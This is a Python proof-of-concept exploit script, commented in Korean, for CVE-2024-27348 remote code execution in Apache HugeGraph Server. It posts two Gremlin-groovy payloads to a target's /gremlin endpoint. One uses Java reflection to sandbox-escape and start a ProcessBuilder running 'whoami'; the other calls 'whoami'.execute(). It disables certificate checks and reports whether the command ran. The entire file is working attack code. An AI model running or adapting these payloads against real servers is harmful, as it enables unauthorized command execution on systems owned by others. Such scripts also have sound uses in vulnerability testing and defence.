import requests
import json
import argparse

# 기본 실행 명령
DEFAULT_COMMAND = "whoami"

def exploit(target):
    url = f"{target}/gremlin"
    headers = {"Content-Type": "application/json"}
    detected_vulnerability = False

    # 첫 번째 페이로드 생성
    payload1 = {
        "gremlin": f"Thread thread = Thread.currentThread();Class clz = Class.forName(\"java.lang.Thread\");java.lang.reflect.Field field = clz.getDeclaredField(\"name\");field.setAccessible(true);field.set(thread, \"VICARIUS\");Class processBuilderClass = Class.forName(\"java.lang.ProcessBuilder\");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\"whoami\");Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\"start\");startMethod.invoke(processBuilderInstance);",
        "bindings": {},
        "language": "gremlin-groovy",
        "aliases": {}
    }

    # 두 번째 페이로드 생성
    payload2 = {
        "gremlin": f"def result = \"whoami\".execute().text\njava.lang.reflect.Field field = Thread.currentThread().getClass().getDeclaredField(result);",
    }

    try:
        # 첫 번째 페이로드 전송
        response = requests.post(url, headers=headers, data=json.dumps(payload1), verify=False, timeout=15)
        if handle_response(response, "payload 1"):
            detected_vulnerability = True

        # 두 번째 페이로드 전송
        response = requests.post(url, headers=headers, data=json.dumps(payload2), verify=False, timeout=15)
        if handle_response(response, "payload 2"):
            detected_vulnerability = True

    except Exception as e:
        print(f"[!] Exception with {target}: {e}")

    return detected_vulnerability


def handle_response(response, payload):
    if (response.status_code in [200, 500]) and ("\"code\":200" in response.text) and ("Failed to do request" not in response.text):
        print(f"[+] Command executed successfully with {payload}")
        return True
    else:
        print(f"[-] Request failed with {payload}")
        print(f"[-] Status code: {response.status_code}")
        print(f"[-] Response text: {response.text}")
        return False


if __name__ == "__main__":
    # 명령줄 인자 처리
    parser = argparse.ArgumentParser(description="Exploit script for CVE-2024-27348 Remote Code Execution in Apache HugeGraph Server.")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    args = parser.parse_args()

    # 입력된 URL로 실행
    target = args.url

    print("Proof of Concept exploit for CVE-2024-27348 Remote Code Execution in Apache HugeGraph Server")
    print(f"[+] Target: {target}")
    print(f"[+] Command: {DEFAULT_COMMAND}")

    # 취약점 분석
    is_vulnerable = exploit(target)

    # 결과 출력
    if is_vulnerable:
        print("\nDetected Vulnerability: True")
    else:
        print("\nDetected Vulnerability: False")
